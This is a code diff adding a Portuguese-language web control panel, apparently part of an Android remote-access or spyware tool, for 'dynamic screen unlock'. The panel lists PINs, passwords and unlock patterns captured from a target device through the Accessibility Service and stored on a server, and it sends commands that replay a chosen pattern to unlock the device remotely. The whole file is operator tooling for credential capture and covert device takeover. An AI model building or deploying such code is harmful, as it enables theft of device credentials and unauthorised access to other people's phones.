@@ -1,0 +1,375 @@
+<div class="ui container segment">
+    <h3 class="ui header">Desbloqueio de Tela Dinâmico</h3>
+    <p>Captura e replica padrões de PIN, senha ou desenho para desbloquear automaticamente a tela.</p>
+
+    <div class="ui divider"></div>
+
+    <!-- Painel de Status -->
+    <div class="ui grid">
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Status de Captura</h4>
+                <p>Monitore padrões capturados do dispositivo.</p>
+
+                <div class="ui form">
+                    <div class="field">
+                        <label>Padrões Capturados</label>
+                        <div class="ui statistic" style="margin: 10px 0;">
+                            <div class="value" id="patternCount" style="color: #2ecc71;">
+                                0
+                            </div>
+                            <div class="label">Padrões</div>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label>Tipo de Desbloqueio</label>
+                        <div id="unlocktypesList" style="margin: 10px 0;">
+                            <p style="color: #999;">Aguardando captura...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Controle Automático</h4>
+                <p>Configure o desbloqueio automático.</p>
+
+                <div class="ui form">
+                    <div class="field">
+                        <div class="ui toggle checkbox" id="autoUnlockToggle">
+                            <input type="checkbox" id="autoUnlockEnabled">
+                            <label>Desbloqueio Automático <span id="autoUnlockStatus">Desabilitado</span></label>
+                        </div>
+                    </div>
+
+                    <button class="ui mini button" onclick="testUnlock()" style="margin-top: 20px;">
+                        <i class="play icon"></i>
+                        Testar Desbloqueio
+                    </button>
+
+                    <button class="ui mini red button" onclick="clearPatterns()" style="margin-left: 5px;">
+                        <i class="trash icon"></i>
+                        Limpar Padrões
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Informações de Padrões Capturados -->
+    <div class="ui segment">
+        <h4>Padrões Capturados</h4>
+        <p>Detalhes dos padrões de desbloqueio armazenados.</p>
+
+        <table class="ui celled table">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Tipo</th>
+                    <th>Complexidade</th>
+                    <th>Data de Captura</th>
+                    <th>Comprimento</th>
+                    <th>Ações</th>
+                </tr>
+            </thead>
+            <tbody id="patternsTable">
+                <tr>
+                    <td colspan="6" style="text-align: center; color: #999;">
+                        <i class="spinner loading icon"></i>
+                        Carregando...
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Instruções de Captura -->
+    <div class="ui segment">
+        <h4>Como Funciona a Captura</h4>
+        <div class="ui list">
+            <div class="item">
+                <i class="circle icon"></i>
+                <div class="content">
+                    <strong>Passo 1:</strong> Deixe o dispositivo ligado normalmente
+                </div>
+            </div>
+            <div class="item">
+                <i class="circle icon"></i>
+                <div class="content">
+                    <strong>Passo 2:</strong> Quando a tela desbloquear naturalmente, o padrão é automaticamente capturado
+                </div>
+            </div>
+            <div class="item">
+                <i class="circle icon"></i>
+                <div class="content">
+                    <strong>Passo 3:</strong> Habilite "Desbloqueio Automático" para usar os padrões capturados
+                </div>
+            </div>
+            <div class="item">
+                <i class="circle icon"></i>
+                <div class="content">
+                    <strong>Resultado:</strong> Quando a tela bloquear, será desbloqueada automaticamente
+                </div>
+            </div>
+        </div>
+
+        <div class="ui message" style="margin-top: 15px;">
+            <strong>Nota:</strong> O padrão é capturado através do Accessibility Service e armazenado com segurança no servidor.
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Log de Desbloqueios -->
+    <div class="ui segment">
+        <h4>Log de Desbloqueios</h4>
+        <p>Histórico de tentativas de desbloqueio automático.</p>
+
+        <table class="ui celled table">
+            <thead>
+                <tr>
+                    <th>Ação</th>
+                    <th>Tipo de Padrão</th>
+                    <th>Data/Hora</th>
+                    <th>Status</th>
+                    <th>Detalhes</th>
+                </tr>
+            </thead>
+            <tbody id="unlockLogTable">
+                <tr>
+                    <td colspan="5" style="text-align: center; color: #999;">
+                        <i class="spinner loading icon"></i>
+                        Carregando...
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+
+        <button class="ui mini red button" onclick="clearUnlockLog(this)" style="margin-top: 10px;">
+            <i class="trash icon"></i>
+            Limpar Log
+        </button>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            loadUnlockStatus();
+            loadPatterns();
+            loadUnlockLog();
+
+            setInterval(function() {
+                loadPatterns();
+                loadUnlockLog();
+            }, 3000);
+
+            $('#autoUnlockToggle').on('change', function() {
+                const enabled = $(this).is(':checked');
+                toggleAutoUnlock(enabled);
+            });
+        });
+
+        function getDeviceId() {
+            const match = window.location.pathname.match(/\/manage\/([^\/]+)/);
+            return match ? match[1] : '';
+        }
+
+        function loadUnlockStatus() {
+            $.get(`/manage/${getDeviceId()}/dsu/log`, function(data) {
+                if (data.error === false && data.data) {
+                    if (data.data.autoUnlockEnabled) {
+                        $('#autoUnlockToggle').checkbox('check');
+                        $('#autoUnlockStatus').text('Habilitado').css('color', 'green');
+                    } else {
+                        $('#autoUnlockToggle').checkbox('uncheck');
+                        $('#autoUnlockStatus').text('Desabilitado').css('color', 'red');
+                    }
+
+                    if (data.data.capturedPatterns && data.data.capturedPatterns.length > 0) {
+                        $('#patternCount').text(data.data.capturedPatterns.length);
+
+                        const types = new Set();
+                        data.data.capturedPatterns.forEach(p => {
+                            types.add(p.type || 'unknown');
+                        });
+
+                        let html = '';
+                        types.forEach(type => {
+                            html += `<div style="padding: 5px 0;"><i class="lock icon"></i> ${type}</div>`;
+                        });
+                        $('#unlocktypesList').html(html);
+                    }
+                }
+            });
+        }
+
+        function loadPatterns() {
+            $.get(`/manage/${getDeviceId()}/dsu/log`, function(data) {
+                if (data.error === false && data.data && data.data.capturedPatterns) {
+                    const patterns = data.data.capturedPatterns;
+
+                    if (patterns.length === 0) {
+                        $('#patternsTable').html(`
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: #999;">
+                                    Nenhum padrão capturado ainda
+                                </td>
+                            </tr>
+                        `);
+                        return;
+                    }
+
+                    let html = '';
+                    patterns.forEach((pattern, index) => {
+                        const timestamp = new Date(pattern.timestamp).toLocaleString('pt-BR');
+                        const complexity = pattern.pattern ? 
+                            (pattern.pattern.length < 6 ? 'Baixa' : pattern.pattern.length < 10 ? 'Média' : 'Alta') 
+                            : 'N/A';
+
+                        html += `
+                            <tr>
+                                <td>${index + 1}</td>
+                                <td>${pattern.type}</td>
+                                <td>${complexity}</td>
+                                <td>${timestamp}</td>
+                                <td>${pattern.pattern ? pattern.pattern.length : 0}</td>
+                                <td>
+                                    <button class="ui mini blue button" onclick="usePattern(${index})">Usar</button>
+                                </td>
+                            </tr>
+                        `;
+                    });
+
+                    $('#patternsTable').html(html);
+                }
+            });
+        }
+
+        function loadUnlockLog() {
+            $.get(`/manage/${getDeviceId()}/dsu/log`, function(data) {
+                if (data.error === false && data.data && data.data.unlockLog) {
+                    const log = data.data.unlockLog;
+
+                    if (log.length === 0) {
+                        $('#unlockLogTable').html(`
+                            <tr>
+                                <td colspan="5" style="text-align: center; color: #999;">
+                                    Nenhuma tentativa registrada
+                                </td>
+                            </tr>
+                        `);
+                        return;
+                    }
+
+                    let html = '';
+                    log.slice().reverse().forEach(entry => {
+                        const statusIcon = entry.success
+                            ? '<i class="check icon" style="color: green;"></i> Sucesso'
+                            : '<i class="times icon" style="color: red;"></i> Falha';
+
+                        const timestamp = new Date(entry.timestamp).toLocaleString('pt-BR');
+
+                        html += `
+                            <tr>
+                                <td>${entry.action}</td>
+                                <td>${entry.patternType}</td>
+                                <td>${timestamp}</td>
+                                <td>${statusIcon}</td>
+                                <td>${entry.details}</td>
+                            </tr>
+                        `;
+                    });
+
+                    $('#unlockLogTable').html(html);
+                }
+            });
+        }
+
+        function toggleAutoUnlock(enabled) {
+            const url = enabled
+                ? `/manage/${getDeviceId()}/dsu/enable_auto`
+                : `/manage/${getDeviceId()}/dsu/disable_auto`;
+
+            $.post(url, function(response) {
+                if (response.error === false) {
+                    showNotification('#2ecc71', response.message);
+                    loadUnlockStatus();
+                } else {
+                    showNotification('#f03434', response.error);
+                }
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao conectar');
+            });
+        }
+
+        function testUnlock() {
+            $.post(`/manage/${getDeviceId()}/0xDSU`, {
+                action: 'replay_pattern',
+                patternType: 'test'
+            }, function(response) {
+                if (response.error === false) {
+                    showNotification('#2ecc71', 'Comando de teste enviado');
+                    setTimeout(loadUnlockLog, 1000);
+                } else {
+                    showNotification('#f03434', response.error);
+                }
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao conectar');
+            });
+        }
+
+        function usePattern(index) {
+            $.post(`/manage/${getDeviceId()}/0xDSU`, {
+                action: 'replay_pattern',
+                patternIndex: index
+            }, function(response) {
+                if (response.error === false) {
+                    showNotification('#2ecc71', 'Padrão enviado');
+                } else {
+                    showNotification('#f03434', response.error);
+                }
+            });
+        }
+
+        function clearPatterns() {
+            if (!confirm('Tem certeza? Isto limpará todos os padrões capturados.')) return;
+
+            $.ajax({
+                type: 'DELETE',
+                url: `/manage/${getDeviceId()}/dsu/patterns`,
+                success: function(data) {
+                    showNotification('#2ecc71', data.message);
+                    loadPatterns();
+                },
+                error: function() {
+                    showNotification('#f03434', 'Erro ao limpar padrões');
+                }
+            });
+        }
+
+        function clearUnlockLog(element) {
+            if (!confirm('Limpar log de desbloqueios?')) return;
+
+            $(element).addClass('loading');
+            $.ajax({
+                type: 'DELETE',
+                url: `/manage/${getDeviceId()}/dsu/log`,
+                success: function(data) {
+                    showNotification('#2ecc71', data.message);
+                    loadUnlockLog();
+                    $(element).removeClass('loading');
+                },
+                error: function() {
+                    showNotification('#f03434', 'Erro ao limpar log');
+                    $(element).removeClass('loading');
+                }
+            });
+        }
+    </script>
+</div>
